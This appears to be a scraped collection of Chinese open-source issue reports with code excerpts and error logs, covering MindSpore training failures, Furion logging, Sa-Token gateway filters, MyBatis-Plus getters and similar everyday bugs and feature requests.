 [新功能] 编写依赖注入/控制反转核心代码,任务清单： 集成 第三方组件 提供项目程序集扫描拓展类 设计灵活的依赖注入项目注入启动类   <code>: Autofac
开源版本如何实现多租户模式?,"application.yml 已经打开了 多租户模式（SAAS模式）（专业版） useCorpModel: true Model中也做了如下设置: @Column(includeEntity=DataEntity.class), @Column(includeEntity=BaseEntity.class) 生成的INSET SQL 中没有包含 corp_code 和corp_name INSERT INTO hobbit_healthclub_serviceitems (, , , , , , , , , , , , ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)   <code>: id clubid serviceitems summary serviceitemsdetail serviceprice grossprofit status create_by create_date update_by update_date remarks"
本地存储文件，上传后不可见,首先感谢高质量开源！！ 按照教程配置了nginx及设置文件存储配置如下： 值得注意的是，我曾经尝试修改配置listen其他端口如8080，则可以通过正常访问显示图片，此时设置文件存储配置为，依然报错404。 而当按照示例配置监听80端口，在浏览器通过类似的ip地址进行访问图片，会报404 Not Found错误。 排查后发现80端口并没有被其他进程占用。 本人对nginx配置尚在学习阶段、了解不深，请问可否对排查问题位置的方法提出建议，万分感谢。 2. 在哪个步骤出现了问题？ 3. 您希望得到什么结果？   <code>: http://服务器ip:8080/oneblog/图片名称 http://服务器ip:8080/
[ST][MS][NET][ctpn][910 8p][ExchangerNetwork][Recv]rank[7] block receive failed,"ctpn网络在910环境8p训练失败，报rank0连不上rank7，非必现问题 / 硬件环境: /device ascend : -- MindSpore version :r1.8 commit_id:2edfa7bd -- Python version : -- OS platform and distribution : -- GCC/Compiler version : run包:HiAI/HISI_C82/20220714 MindSpore 版本：编译时间20220716160710 r1.8.0 commit_id:fe4ae5481cb (/): /mode graph test_ms_ctpn_check_loss_8p_0001.py cd solution_test/remaining/test_scriptes/mindspore/net/ctpn/network python -m nose -s --nologcapture test_ms_ctpn_check_loss_8p_0001.py 网络训练成功 http://mindspore-nfs.csi.rnd.huawei.com/logs/log_info/202207/20220722/test_ms_ctpn_check_loss_8p_0001.tar.gz 走给刘步宇   <code>: [ERROR] HCCL(78113,python):2022-07-22-01:34:35.419.184 [adapter_hccp.cc:703][78113][166725][Recv][RaSocket]errNo[0x000000000500000d] recv fail, fdHandle[0xfffa4c005f40], data[0xfffae4ff7210], size[2048] [ERROR] HCCL(78113,python):2022-07-22-01:34:35.419.246 [exchanger_network.cc:547][78113][166725]call trace: ret -&gt; 13 [ERROR] HCCL(78113,python):2022-07-22-01:34:35.419.262 [exchanger_network.cc:618][78113][166725][ExchangerNetwork][Recv]rank[7] block receive failed [ERROR] HCCL(78113,python):2022-07-22-01:34:35.419.275 [exchanger_network.cc:573][78113][166725][ExchangerNetwork][Recv]errNo[0x0000000005000004] rank[7] block receive failed [ERROR] HCCL(78113,python):2022-07-22-01:34:35.419.290 [transport_base.cc:164][78113][166725][Exchange][TgidMesg]errNo[0x0000000005000004] In exchange tgid mesg, recv output name failed. remote userrank[4] pid[] local rank[7] [ERROR] HCCL(78113,python):2022-07-22-01:34:35.419.302 [transport_p2p.cc:71][78113][166725]call trace: ret -&gt; 4 [ERROR] HCCL(78113,python):2022-07-22-01:34:35.419.312 [comm_base.cc:1083][78113][166725]call trace: ret -&gt; 4 [ERROR] HCCL(78113,python):2022-07-22-01:34:35.419.343 [comm_base.cc:1028][78113][166725][Create][DestLink]Transport init error [ERROR] HCCL(78113,python):2022-07-22-01:34:35.546.206 [adapter_hccp.cc:703][78113][166727][Recv][RaSocket]errNo[0x000000000500000d] recv fail, fdHandle[0xfffa4c065e30], data[0xfffae3ff5210], size[2048] [ERROR] HCCL(78113,python):2022-07-22-01:34:35.546.241 [exchanger_network.cc:547][78113][166727]call trace: ret -&gt; 13 [ERROR] HCCL(78113,python):2022-07-22-01:34:35.546.256 [exchanger_network.cc:618][78113][166727][ExchangerNetwork][Recv]rank[7] block receive failed [ERROR] HCCL(78113,python):2022-07-22-01:34:35.546.285 [exchanger_network.cc:573][78113][166727][ExchangerNetwork][Recv]errNo[0x0000000005000004] rank[7] block receive failed [ERROR] HCCL(78113,python):2022-07-22-01:34:35.546.299 [transport_base.cc:164][78113][166727][Exchange][TgidMesg]errNo[0x0000000005000004] In exchange tgid mesg, recv output name failed. remote userrank[3] pid[] local rank[7] [ERROR] HCCL(78113,python):2022-07-22-01:34:35.546.310 [transport_p2p.cc:71][78113][166727]call trace: ret -&gt; 4 [ERROR] HCCL(78113,python):2022-07-22-01:34:35.546.320 [comm_base.cc:1083][78113][166727]call trace: ret -&gt; 4 [ERROR] HCCL(78113,python):2022-07-22-01:34:35.546.333 [comm_base.cc:1028][78113][166727][Create][DestLink]Transport init error [ERROR] HCCL(78113,python):2022-07-22-01:34:35.546.411 [comm_base.cc:316][78113][165784][Check][Links]there is no effective link(type[1]) between rank[6] and dst rank[5]! [ERROR] HCCL(78113,python):2022-07-22-01:34:35.546.440 [comm_base.cc:84][78113][165784]call trace: ret -&gt; 6 [ERROR] HCCL(78113,python):2022-07-22-01:34:35.546.454 [comm_factory.cc:282][78113][165784][Create][CommOuter]comm outer array[0] init failed [ERROR] HCCL(78113,python):2022-07-22-01:34:40.856.425 [hccl_impl.cc:2122][78113][165784][Create][OuterComm]errNo[0x0000000005000006] tag[HcomAllReduce_6629421139219749105_0], created commOuter fail. commOuter[0] is null [ERROR] HCCL(78113,python):2022-07-22-01:34:40.856.562 [hccl_impl.cc:1996][hccl-78113-0-1658423841-hccl_world_group][7][Create][CommByAlg]CreateInnerComm [0] or CreateOuterComm[6] failed. commType[2] [ERROR] HCCL(78113,python):2022-07-22-01:34:40.856.591 [hccl_impl.cc:1925][hccl-78113-0-1658423841-hccl_world_group][7]call trace: ret -&gt; 4 [ERROR] HCCL(78113,python):2022-07-22-01:34:40.856.615 [hccl_impl.cc:985][hccl-78113-0-1658423841-hccl_world_group][7][HcclImpl][AllReduce]errNo[0x0000000005000004] tag[HcomAllReduce_6629421139219749105_0],all reduce create comm failed [ERROR] HCCL(78113,python):2022-07-22-01:34:40.856.625 [hccl_comm.cc:254][hccl-78113-0-1658423841-hccl_world_group][7]call trace: ret -&gt; 4 [ERROR] HCCL(78113,python):2022-07-22-01:34:40.856.643 [hcom.cc:369][hccl-78113-0-1658423841-hccl_world_group][7][AllReduce][Result]errNo[0x0000000005010004] hcclComm all reduce error, tag[HcomAllReduce_6629421139219749105_0],input_ptr[0x120140000200], output_ptr[0x1201445dca00], count[18313472], data_type[4], op[0], stream[0xaaab552d7620] [ERROR] HCCL(78113,python):2022-07-22-01:34:40.856.663 [hcom_ops_kernel_info_store.cc:422][hccl-78113-0-1658423841-hccl_world_group][7]call trace: ret -&gt; 4 [ERROR] HCCL(78113,python):2022-07-22-01:34:40.856.699 [hcom_ops_kernel_info_store.cc:286][hccl-78113-0-1658423841-hccl_world_group][7]call trace: ret -&gt; 4 [ERROR] HCCL(78113,python):2022-07-22-01:34:40.856.711 [hcom_ops_kernel_info_store.cc:1136][hccl-78113-0-1658423841-hccl_world_group][7][Load][Task]errNo[0x0000000005010004] load task failed. (load op[HcomAllReduce] fail) [CRITICAL] GE(78113,ffffa7e87480,python):2022-07-22-01:34:40.856.794 [mindspore/ccsrc/plugin/device/ascend/hal/device/ge_runtime/task/hccl_task.cc:103] Distribute] davinci_model : load task fail, return ret: 1343225860 [CRITICAL] DEVICE(78113,ffffa7e87480,python):2022-07-22-01:35:01.885.972 [mindspore/ccsrc/plugin/device/ascend/hal/device/ascend_kernel_runtime.cc:543] LoadTask] Distribute Task Failed, error msg: davinci_model : load task fail, return ret: 1343225860 ---------------------------------------------------- - C++ Call Stack: (For framework developers) ---------------------------------------------------- mindspore/ccsrc/plugin/device/ascend/hal/device/ge_runtime/task/hccl_task.cc:103 Distribute [CRITICAL] DEVICE(78113,ffffa7e87480,python):2022-07-22-01:35:01.886.206 [mindspore/ccsrc/plugin/device/ascend/hal/hardware/ascend_kernel_executor.cc:214] PreprocessBeforeRunGraph] Preprocess failed before run graph 1, error msg: Distribute Task Failed, error msg: davinci_model : load task fail, return ret: 1343225860 ---------------------------------------------------- - C++ Call Stack: (For framework developers) ---------------------------------------------------- mindspore/ccsrc/plugin/device/ascend/hal/device/ascend_kernel_runtime.cc:543 LoadTask mindspore/ccsrc/plugin/device/ascend/hal/device/ge_runtime/task/hccl_task.cc:103 Distribute [CRITICAL] ME(78113:281473498772608,MainProcess):2022-07-22-01:35:01.977.696 [mindspore/dataset/engine/datasets.py:2912] Uncaught exception: Traceback (most recent call last): File ""train.py"", line 188, in &lt;module&gt; train() File ""/home/jenkins/workspace/TDT_deployment/solution_test/remaining/test_scripts/mindspore/net/ctpn/network/test_ms_ctpn_check_loss_8p_0001/train_parallel7/src/model_utils/moxing_adapter.py"", line 113, in wrapped_func run_func(*args, **kwargs) File ""train.py"", line 185, in train model.train(20, dataset, callbacks=cb, dataset_sink_mode=True, sink_size=1000) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 1069, in train initial_epoch=initial_epoch) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 96, in wrapper func(self, *args, **kwargs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 622, in _train cb_params, sink_size, initial_epoch, valid_infos) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 700, in _train_dataset_sink_process outputs = train_network(*inputs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 576, in __call__ out = self.compile_and_run(*args) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 963, in compile_and_run self.compile(*inputs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 936, in compile jit_config_dict=self._jit_config_dict) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/common/api.py"", line 1095, in compile result = self._graph_executor.compile(obj, args_list, phase, self._use_vm_mode()) RuntimeError: Preprocess failed before run graph 1, error msg: Distribute Task Failed, error msg: davinci_model : load task fail, return ret: 1343225860 ---------------------------------------------------- - C++ Call Stack: (For framework developers) ---------------------------------------------------- mindspore/ccsrc/plugin/device/ascend/hal/hardware/ascend_kernel_executor.cc:214 PreprocessBeforeRunGraph mindspore/ccsrc/plugin/device/ascend/hal/device/ascend_kernel_runtime.cc:543 LoadTask mindspore/ccsrc/plugin/device/ascend/hal/device/ge_runtime/task/hccl_task.cc:103 Distribute [ERROR] ASCENDCL(78113,python):2022-07-22-01:35:12.356.902 [tensor_data_transfer.cpp:899]124551 acltdtSendTensor: [Push][Data]failed to send, tdt result = -1, device is 7, name is 12f9abaa-0919-11ed-b93f-4cf55bcfc881 [ERROR] MD(78113,fffc4cff91e0,python):2022-07-22-01:35:12.357.275 [mindspore/ccsrc/minddata/dataset/engine/tdt/tdt_plugin.cc:246] ReportErrorMessage] Ascend error occurred, error message: EH9999: Inner Error! EH9999 [Push][Data]failed to send, tdt result = -1, device is 7, name is 12f9abaa-0919-11ed-b93f-4cf55bcfc881[FUNC:ReportInnerError][FILE:log_inner.cpp][LINE:146] [ERROR] MD(78113,fffc4cff91e0,python):2022-07-22-01:35:12.357.741 [mindspore/ccsrc/minddata/dataset/util/task_manager.cc:219] InterruptMaster] Task is terminated with err msg (more details are in info level logs): Unexpected error. TDT Push data into device Failed, check the first error or TraceBack first, more checking advises are: 1) if training is not ready, error might raised by network computing operator or environment configuration. 2) other cases, checking info level log or search this error in mindspore's FAQ for detail solution. Line of code : 330 File : mindspore/ccsrc/minddata/dataset/engine/datasetops/device_queue_op.cc [WARNING] MD(78113,ffffa7e87480,python):2022-07-22-01:35:12.376.796 [mindspore/ccsrc/minddata/dataset/engine/datasetops/device_queue_op.cc:75] ~DeviceQueueOp] preprocess_batch: 83; batch_queue: 16, 16, 16, 15, 16, 15, 16, 15, 16, 15; push_start_time: 2022-07-22-01:18:48.812.187, 2022-07-22-01:18:49.017.801, 2022-07-22-01:18:49.181.542, 2022-07-22-01:18:52.603.682, 2022-07-22-01:18:52.611.998, 2022-07-22-01:18:52.621.877, 2022-07-22-01:18:52.774.777, 2022-07-22-01:18:52.784.831, 2022-07-22-01:18:52.958.831, 2022-07-22-01:18:52.969.123; push_end_time: 2022-07-22-01:18:48.812.087, 2022-07-22-01:18:49.017.502, 2022-07-22-01:18:49.181.371, 2022-07-22-01:18:52.603.343, 2022-07-22-01:18:52.611.757, 2022-07-22-01:18:52.621.471, 2022-07-22-01:18:52.774.116, 2022-07-22-01:18:52.784.664, 2022-07-22-01:18:52.958.547, 2022-07-22-01:18:52.969.013. [ERROR] HCCL(78113,python):2022-07-22-01:35:13.579.623 [allreducepadding.cc:339][hccl-78113-0-1658423841-hccl_world_group][7][Compare][OutputPaddingMem]Tag[HcomAllReduce_6629421139219749105_0] All Reduce Padding Head Check Failed, index[3]: TargetValue[41], ActualValue[00] [TRACE] HCCL(78113,python):2022-07-22-01:35:13.580.239 [status:stop] [hcom.cc:270][hccl-78113-0-1658423841-hccl_world_group][7]hcom destroy complete,take time [160397]us, rankNum[8], rank[7]"
[CT][MS][OP]Occasional precision failure of solve_triangular interface.,"Occasional precision failure of solve_triangular interface. / 硬件环境: GPU CPU /device gpu /device cpu : -- MindSpore version :master -- Python version :Python 3.7.5 -- OS platform and distribution : -- GCC/Compiler version : (/): pynative graph /mode pynative /mode graph test_solvetriangular_input_a_2d_dtype_fp32_b_2d_fp32_lower_false_trans_t_unit_diagonal_true test_solvetriangular_input_a_2d_dtype_fp32_b_1d_fp32_trans_c pytest -s -v test_solvetriangular.py::test_solvetriangular_input_a_2d_dtype_fp32_b_2d_fp32_lower_false_trans_t_unit_diagonal_true pytest -s -v test_solvetriangular.py::test_solvetriangular_input_a_2d_dtype_fp32_b_1d_fp32_trans_c pass 1.``` def test_solvetriangular_input_a_2d_dtype_fp32_b_2d_fp32_lower_false_trans_t_unit_diagonal_true(): x = np.random.randn(128, 128) input_a = Tensor(np.matmul(x, x.transpose()) + np.eye(128), dtype=mstype.float32) input_b = Tensor(np.random.randn(128, 1), dtype=mstype.float32) lower = False trans = 'T' unit_diagonal = True fact = SolveTriangularMock(inputs=[input_a, input_b, lower, trans, unit_diagonal]) fact.loss = 1e-3 test_solvetriangular.py:188: ../share/ops/primitive/solvetriangular_ops.py:75: in forward_cmp allclose_nparray(out_me, out_scipy, self.loss, self.loss) data_expected = array([[ 1.4658006e-01], [-1.1079369e+00], [-5.1282696e-02], [ 4.6453924e+00], [ 6.7445290...n], [ nan], [ nan], [ nan], [ nan]], dtype=float32) data_me = array([[ 1.4658006e-01], [-1.1079369e+00], [-5.1282696e-02], [ 4.6453924e+00], [ 6.7445290...n], [ nan], [ nan], [ nan], [ nan]], dtype=float32) rtol = 0.001, atol = 0.001, equal_nan = True E AssertionError def test_solvetriangular_input_a_2d_dtype_fp32_b_1d_fp32_trans_c(): x = np.random.randn(128, 128) input_a = Tensor(np.matmul(x, x.transpose()) + np.eye(128), dtype=mstype.float32) input_b = Tensor(np.random.randn(128), dtype=mstype.float32) lower = False trans = 'C' unit_diagonal = True fact = SolveTriangularMock(inputs=[input_a, input_b, lower, trans, unit_diagonal]) test_solvetriangular.py:342: ../share/ops/primitive/solvetriangular_ops.py:136: in forward_cmp allclose_nparray(out_me, out_scipy, self.loss, self.loss) data_expected = array([-8.22780192e-01, 4.57738340e-01, 1.53860912e+01, 1.32625504e+02, 1.25675316e+02, 1.63360577e+01, 1... nan, nan, nan, nan, nan, nan], dtype=float32) data_me = array([-8.22780192e-01, 4.57738340e-01, 1.53860912e+01, 1.32625504e+02, 1.25675323e+02, 1.63360329e+01, 1... nan, nan, nan, nan, nan, nan], dtype=float32) rtol = 0.0001, atol = 0.0001, equal_nan = True E AssertionError   <code>: fact.forward_cmp() def allclose_nparray(data_expected, data_me, rtol, atol, equal_nan=True): if np.any(np.isnan(data_expected)): assert np.allclose(data_expected, data_me, rtol, atol, equal_nan=equal_nan) 2. fact.forward_cmp() def allclose_nparray(data_expected, data_me, rtol, atol, equal_nan=True): if np.any(np.isnan(data_expected)): assert np.allclose(data_expected, data_me, rtol, atol, equal_nan=equal_nan) ### Special notes for this issue/备注 (Optional / 选填)"
UserMapper里这个方法为什么要加::uuid,"insertSelective这个方法里面为什么有个::uuid，导致报错   <code>: &lt;if test=""userUuid != null""&gt; #{userUuid}::uuid, &lt;/if&gt;"
日志输出到数据库 控制台一直在打印日志停不下来,"Furion 版本号 4.2.1 .NET SDK 版本号 .NET5 .NET6 .NET7 Web 项目类型 WebApi Mvc Razor Pages Blazor Server MinApp 启用日志写入数据库，启动项目，控制台一直打印： 停不下来 1、xxx.Web.Core Startup.cs 2、DbLoggingWriter.cs 3.appsettings.json Sqlite SqlServer Mysql Oracle PGSql Firebird Cosmos   <code>: info: Microsoft.EntityFrameworkCore.Infrastructure[10403] Entity Framework Core 6.0.8 initialized 'DefaultDbContext' using provider 'Microsoft.EntityFrameworkCore.SqlServer:6.0.8' with options: SensitiveDataLoggingEnabled DetailedErrorsEnabled MaxPoolSize=100 MigrationsAssembly=furionDemo.Database.Migrations services.AddDatabaseLogging&lt;DbLoggingWriter&gt;(); public class DbLoggingWriter : IDatabaseLoggingWriter { private readonly IRepository&lt;Demo&gt; _demoRep; public DbLoggingWriter(IRepository&lt;Demo&gt; demoRep) { _demoRep = demoRep; } public void Write(LogMessage logMsg, bool flush) { _demoRep.Insert(new Demo { Title = logMsg.Exception == null ? """" : JSON.Serialize(logMsg.Exception) }); } } ""Logging"": { ""LogLevel"": { ""Default"": ""Information"", ""Microsoft"": ""Warning"", ""Microsoft.Hosting.Lifetime"": ""Information"", ""Microsoft.EntityFrameworkCore"": ""Information"" }, ""File"": { ""FileName"": ""logs/info.log"", ""Append"": true, ""MinimumLevel"": ""Information"", ""FileSizeLimitBytes"": 5120, ""MaxRollingFiles"": 100 }, ""Database"": { ""MinimumLevel"": ""Information"" }, ""Monitor"": { ""GlobalEnabled"": true, ""IncludeOfMethods"": [], ""ExcludeOfMethods"": [] } },"
表单验证不通过也被提交了,"表单验证不通过，也显示提示了，但是输入错误的内容，只要输入完全，也被提交了……   <code>: //自定义验证规则 form.verify({ username: function(value){ var reg = /^\w+$/; if(value.length == 0){ $('#tips_username').css(""display"",""block""); $('#tips_username').text(""请输入用户名""); }else if(!reg.test(value)){ $('#tips_username').css(""display"",""block""); $('#tips_username').text(""用户名只能是数字、字母和下划线""); } } ,mobile: function(value){ var reg = /^1([358][0-9]|4[579]|66|7[0135678]|9[89])[0-9]{8}$/; if(value.length == 0){ $('#tips_mobile').css(""display"",""block""); $('#tips_mobile').text(""请输入手机号码""); }else if(!reg.test(value)){ $('#tips_mobile').css(""display"",""block""); $('#tips_mobile').text(""手机号码格式错误""); } } ,ckcode: function(value){ if(value.length == 0){ $('#tips_ckcode').css(""display"",""block""); $('#tips_ckcode').text(""请输入验证码""); } } ,msgcode: function(value){ if(value.length == 0){ $('#tips_msgcode').css(""display"",""block""); $('#tips_msgcode').text(""请输入短信验证码""); } } }); //提交 form.on('submit(login)', function(data){ if($(""#mobile"").val() == """"){ $('#tips_mobile').css(""display"",""block""); $('#tips_mobile').text(""请输入正确的手机号码""); return false; } if($(""#ckcode"").val() == """"){ $('#tips_ckcode').css(""display"",""block""); $('#tips_ckcode').text(""请输入验证码""); return false; } if($(""#msgcode"").val() == """"){ layer.msg(""请获取并输入短信验证码"",{title:false,icon:5}); return false; } var mobile = $(""#mobile"").val(); var msgcode = $(""#msgcode"").val(); $.ajax({ type: ""post"", url: ""login_verify.php"", data:{'type':'login_msgcode','msgcode':msgcode,'mobile':mobile}, dataType:""json"", success: function (result) { if(result.code ==""0"") { layer.msg(result.data.msgcode_tips,{title:false,icon:0}); $('#imgcode').attr('src','/checkcode.php?' + Math.random());//刷新验证码 return false; } if(result.code ==""1"") { window.location.href=""index.php""; return false; } }, error: function (result) { layer.msg(""登录错误！请联系系统管理员处理！"",{title:false,icon:5}); $('#imgcode').attr('src','/checkcode.php?' + Math.random());//刷新验证码 return false; } }); });"
ops.Pow() 做开方运行时Ascend结果与CPU不一致,"ops.Pow() 的参数y&lt;1，参数x&lt;0时，Ascend结果为0且与CPU不一致 ops.Pow()(x,y)算子 对输入参数x 计算每个元素的 y 次幂， 当x中元素 x_i &lt; 0, 且 0&lt;y &lt;1时，在Ascend设备上输出为0，在CPU设备上输出为nan。 Ascend上的输出结果不合理。 / 硬件环境: /device ascend : -- MindSpore version :1.7.0 -- Python version : 3.7.6 -- OS platform and distribution : -- GCC/Compiler version : (/): /mode graph 使用测试脚本： Ascend上的输出结果与CPU一致。 CPU输出结果： [[1. ] [1.4142135] [ nan]] Float32 Ascend输出结果： [[1. ] [1.4142137] [0. ]] Float32   <code>: def main(): input_x = Tensor(np.array([[1.0], [2.0], [-4.0]]), mindspore.float32) input_y = 0.5 _pow = ops.Pow() out = _pow(input_x, input_y) print(out) print(out.dtype)"
中文转拼音多音字建议,"JDK版本： openjdk_8_201 hutool版本： 5.X.X 建议: 中文转拼音多音字问题,我感觉挺常用的   <code>: public static String getPinyin(String str, String separator, Map&lt;String, String&gt; dictionary) { StrBuilder result = StrUtil.strBuilder(); boolean isFirst = true; int strLen = str.length(); try { for (int i = 0; i &lt; strLen; ++i) { if (isFirst) { isFirst = false; } else { result.append(separator); } HanyuPinyinOutputFormat hanyuPinyinOutputFormat = new HanyuPinyinOutputFormat(); hanyuPinyinOutputFormat.setCaseType(HanyuPinyinCaseType.LOWERCASE); hanyuPinyinOutputFormat.setToneType(HanyuPinyinToneType.WITHOUT_TONE); hanyuPinyinOutputFormat.setVCharType(HanyuPinyinVCharType.WITH_V); String[] pinyinStringArray = PinyinHelper.toHanyuPinyinStringArray(str.charAt(i), hanyuPinyinOutputFormat); if (ArrayUtil.isEmpty(pinyinStringArray)) { result.append(str.charAt(i)); } else { if (i != strLen - 1) { String dic = str.charAt(i) + Convert.toStr(str.charAt(i + 1)); for (String pinyin : pinyinStringArray) { String lowerKey = pinyin.toLowerCase(); if (lowerKey.equals(dictionary.get(dic))) { pinyinStringArray[0] = pinyin; break; } } } if (i &gt; 0) { String dic = str.charAt(i - 1) + Convert.toStr(str.charAt(i)); for (String pinyin : pinyinStringArray) { String lowerKey = pinyin.toLowerCase(); if (lowerKey.equals(dictionary.get(dic))) { pinyinStringArray[0] = pinyin; break; } } } result.append(pinyinStringArray[0]); } } } catch (BadHanyuPinyinOutputFormatCombination var8) { throw new PinyinException(var8); } return result.toString(); } public static void main(String[] args) { Map&lt;String, String&gt; dictionary = new HashMap&lt;&gt;(); dictionary.put(""银行"", ""hang""); dictionary.put(""朝阳"", ""zhao""); String s1 = getPinyin(""银行abc朝阳吕布DDD 你觉 --得+呢"", """", dictionary); System.out.println(s1); } 结果: yinhangabczhaoyanglvbuDDD nijue --de+ni"
网关多账号过滤器写法,"使用版本: 1.27.0 过滤器多账号： SaRouter.match过时方法用什么代替？ 我下面多账号的写法认证是否有问题？   <code>: /** * 注册 [Sa-Token全局过滤器] */ @Bean public SaReactorFilter getSaServletFilter() { return new SaReactorFilter() // 拦截路由 .addInclude(""/**"") // 放行路由 .addExclude(""/favicon.ico"") // 认证函数: 每次请求执行 .setAuth(r -&gt; { // 系统 PC 登录验证 -- 拦截所有路由 SaRouter.match(Collections.singletonList(""/system/**""), // 未登录可以访问的路由 filterIgnorePropertiesConfig.getSystem(), ColaSystemUtil::checkLogin); // 租户登录验证 -- 拦截所有路由 SaRouter.match(Collections.singletonList(""/tenant/**""), // 未登录可以访问的路由 filterIgnorePropertiesConfig.getTenant(), ColaTenantUtil::checkLogin); // 会员登录验证 -- 拦截所有路由 SaRouter.match(Collections.singletonList(""/vip/**""), // 未登录可以访问的路由 filterIgnorePropertiesConfig.getVip(), ColaVipUtil::checkLogin); }) // 异常处理函数：每次认证函数发生异常时执行此函数 .setError(e -&gt; JSON.toJSONString(Response.buildFailure(BaseExceptionEnum.INVALIDED_TOKEN.getErrCode(), BaseExceptionEnum.INVALIDED_TOKEN.getErrMessage())) ) // 前置函数：在每次认证函数之前执行 .setBeforeAuth(r -&gt; { // ---------- 设置一些安全响应头 ---------- SaHolder.getResponse() // 服务器名称 .setServer(""cola-cloud"") // 是否可以在iframe显示视图： DENY=不可以 | SAMEORIGIN=同域下可以 | ALLOW-FROM uri=指定域名下可以 .setHeader(""X-Frame-Options"", ""SAMEORIGIN"") // 是否启用浏览器默认XSS防护： 0=禁用 | 1=启用 | 1; mode=block 启用, 并在检查到XSS攻击时，停止渲染页面 .setHeader(""X-XSS-Protection"", ""1; mode=block"") // 禁用浏览器内容嗅探 .setHeader(""X-Content-Type-Options"", ""nosniff"") ; }); }"
ValidateForm 增加 IsShowLabelTip 参数用于控制是否显示提示,"ValidateForm 增加 IsShowLabelTip 参数用于控制是否显示提示 根据 @alex_zou 提交的PR !2550:feat(#I4YMFK): add tooltip for form label 以及相关 #I4YMFK:Table 编辑框 , 字段显示名称过长会显示省略号, 造成终端客户理解困难 组件 增加一个参数 默认 用于控制鼠标悬停 上时是否显示   <code>: Validate IsShowLabelTip False Label Tooltip"
junit 运行时会报错,java.io.FileNotFoundException: class path resource [META-INF/resources/] cannot be resolved to absolute file path because it does not reside in the file system: jar:file:/E:/soft-data/maven-data/com/github/xiaoymin/knife4j-spring-ui/2.0.5/knife4j-spring-ui-2.0.5.jar!/META-INF/resources/ 在spring boot下执行Junit测试就会报错，但是代码可以正常执行。   <code>: @RunWith(SpringRunner.class) @SpringBootTest(classes = App.class) public class Test { 就是很普通的单元测试 }
监听日志记录的接口返回值可配置是否记录或截断,"一个项目中可能有非常多的接口的返回数据非常庞大，全量的记录会导致日志文件巨大，如果是控制台输出也会造成控制台显示的数据严重滞后。 所以需要一个 或 的功能。 功能清单 支持通过配置文件控制 Methods 是否记录返回值功能 支持通过特性控制 Methods 是否记录返回值功能 支持通过配置文件设置触发截断的阈值 支持通过特性设置触发截断的阈值 支持只截断中间的数据，保留前后数据（如：设置 阈值：500，则前后各保留 250 个字符），因为一个 RESTfulResult ，可能我们只想截断 Data 中的内容，保留 Errors Succeeded Extras StatusCode 中的内容。 期望效果   <code>: 只记录入参不记录返回值 根据自定义的阈值只记录部分返回值 { ""Logging"": { ""Monitor"": { ""GlobalEnabled"": false, // 是否启用全局拦截，默认 `false` ""XXXXXXXMethods"": [], // 指定不显示返回值的特定方法，当 GlobalEnabled: true 有效 ""阈值"": 0, // 允许打印返回值时，大于多少字符就截断，0 为全量输出 ""BahLogLevel"": ""Information"" // 配置 Oops.Oh 和 Oops.Bah 业务日志输出级别，默认 Information } } } public class TestLoggerServices : IDynamicApiController { [不打印返回值] public PersonDto GetPerson(int id) { return new PersonDto { Id = id }; } // 只保留前五百字符 [LoggingMonitor(500)] public PersonDto GetPerson(int id) { return new PersonDto { Id = id }; } }"
多个类集成测试会造成数据库定位器多次注册，无法运行所有测试，只能一个类一个类的运行,"Furion 版本号 2.3.4 Web 项目类型 WebApi Mvc Razor Pages Blazor Server 发生了什么？ 多个类集成测试无法一起运行，会出现默认数据库定位器多次注册的错误！ 异常堆栈是什么？ System.InvalidOperationException : The locator is bound to another DbContext. 代码或代码仓库 什么代码导致？ 直接在samples添加一个XUnit项目，引用Furion.Web.Entry和nuget安装Microsoft.AspNetCore.Mvc.Testing,下面单个类可以测试成功，一起测试则会报错 Sqlite SqlServer Mysql Oracle PGSql Firebird Cosmos 期待能一次运行所有类的测试！实在不行就算了，一个类一个类运行！   <code>: Furion.DatabaseAccessor.MasterDbContextLocator public class PersonControllerTest :IClassFixture&lt;WebApplicationFactory&lt;Furion.Web.Entry.Startup&gt;&gt; { private readonly ITestOutputHelper _output; private readonly WebApplicationFactory&lt;Furion.Web.Entry.Startup&gt; _factory; public PersonControllerTest(WebApplicationFactory&lt;Furion.Web.Entry.Startup&gt; factory, ITestOutputHelper output) { _factory = factory; _output = output; } [Fact] public async Task GetAll_StatusTrue() { var client = _factory.CreateClient(); var response = await client.GetAsync(""/api/person/all""); response.EnsureSuccessStatusCode(); Assert.Equal(HttpStatusCode.OK, response.StatusCode); var responseString = await response.Content.ReadAsStringAsync(); _output.WriteLine(responseString); } } public class RBACControllerTests : IClassFixture&lt;WebApplicationFactory&lt;Furion.Web.Entry.Startup&gt;&gt; { private readonly ITestOutputHelper _output; private readonly WebApplicationFactory&lt;Furion.Web.Entry.Startup&gt; _factory; public RBACControllerTests(WebApplicationFactory&lt;Furion.Web.Entry.Startup&gt; factory, ITestOutputHelper output) { _factory = factory; _output = output; } [Fact] public async Task GetAll_StatusTrue() { var client = _factory.CreateClient(); var model = new LoginInput { Account=""admin"", Password=""admin"" }; var httpContent = new StringContent(JsonConvert.SerializeObject(model)); httpContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue(""application/json""); var response = await client.PostAsync(""/api/rbac/login"", httpContent); response.EnsureSuccessStatusCode(); Assert.Equal(HttpStatusCode.OK, response.StatusCode); var responseString = await response.Content.ReadAsStringAsync(); _output.WriteLine(responseString); } }"
关于IService.selectList(Wrapper<T> var1)接口的疑问,现有使用代码生成器根据数据库表生成的bean（部分字段）： 在Controller有如下调用： 报错： 疑问： 既然代码生成工具生成的get方法为isValid()，为什么后续流程针对Boolean字段的调用却还是使用get？   <code>: //Menu.java private Boolean valid; public Boolean isValid() { return valid; } return service.selectList(new EntityWrapper&lt;&gt;(menu)); com.baomidou.mybatisplus.exceptions.MybatisPlusException: Error: NoSuchMethod in Menu. Cause:java.lang.NoSuchMethodException: com.test.dto.Menu.getValid()
